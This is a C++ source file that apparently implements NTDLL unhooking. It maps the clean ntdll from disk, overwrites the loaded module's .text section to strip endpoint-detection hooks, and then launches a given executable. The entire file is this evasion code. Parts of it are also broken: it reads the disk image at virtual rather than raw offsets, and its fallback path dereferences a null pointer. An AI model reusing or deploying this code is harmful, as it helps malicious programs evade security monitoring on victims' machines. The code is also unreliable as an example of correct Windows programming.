#include "ntdll_unhook.h"
#include <iostream>
#include <fstream>

#define NTDLL "NTDLL.DLL"

// Definitions for PEB and LDR data structures
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    PVOID CrossProcessFlags;
    PVOID KernelCallbackTable;
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
} PEB, * PPEB;

BOOL ReadNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cNtdllPath[MAX_PATH] = { 0 };
    HANDLE hFile = NULL;
    DWORD dwNumberOfBytesRead = NULL, dwFileLen = NULL;
    PVOID pNtdllBuffer = NULL;

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        std::cerr << "[!] GetWindowsDirectoryA Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunc;
    }

    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] CreateFileA Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunc;
    }

    dwFileLen = GetFileSize(hFile, NULL);
    pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);

    if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
        std::cerr << "[!] ReadFile Failed With Error : " << GetLastError() << std::endl;
        std::cerr << "[i] Read " << dwNumberOfBytesRead << " of " << dwFileLen << " Bytes" << std::endl;
        goto _EndOfFunc;
    }

    *ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
    if (hFile)
        CloseHandle(hFile);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;
}

PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[!] Invalid DOS signature for local NTDLL." << std::endl;
        return FALSE;
    }

    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[!] Invalid NT signature for local NTDLL." << std::endl;
        return FALSE;
    }

    PVOID pLocalNtdllTxt = NULL, pRemoteNtdllTxt = NULL;
    SIZE_T sNtdllTxtSize = NULL;

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
        // std::cout << "[*] Section name: " << std::string((char*)pSectionHeader[i].Name, 8) << std::endl;
        if (strncmp((char*)pSectionHeader[i].Name, ".text", 5) == 0) {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
        std::cerr << "[!] Failed to locate the .text section in NTDLL with first method." << std::endl;
        // Attempt to use the known offset values if the section is not found by name
        pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
        if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 4096);
            if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
                std::cerr << "[!] The calculated offset for the .text section is incorrect." << std::endl;
                return FALSE;
            }
        }
        sNtdllTxtSize = pLocalNtHdrs->OptionalHeader.SizeOfCode;
    }

    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtect [1] Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }

    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtect [2] Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }

    return TRUE;
}

void loadPE(LPCSTR pePath) {
    PVOID pUnhookedNtdll = NULL;
    if (!ReadNtdllFromDisk(&pUnhookedNtdll)) {
        std::cerr << "[!] Failed to read unhooked NTDLL from disk." << std::endl;
        return;
    }

    if (!ReplaceNtdllTxtSection(pUnhookedNtdll)) {
        std::cerr << "[!] Failed to replace NTDLL text section." << std::endl;
        return;
    }

    std::cout << "[*] Attempting to load PE from path: " << pePath << std::endl;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process.
    if (!CreateProcessA(pePath,   // the path
        NULL,        // Command line
        NULL,        // Process handle not inheritable
        NULL,        // Thread handle not inheritable
        FALSE,       // Set handle inheritance to FALSE
        0,           // No creation flags
        NULL,        // Use parent's environment block
        NULL,        // Use parent's starting directory 
        &si,         // Pointer to STARTUPINFO structure
        &pi)         // Pointer to PROCESS_INFORMATION structure
        )
    {
        std::cerr << "[!] CreateProcessA Failed With Error: " << GetLastError() << std::endl;
        return;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

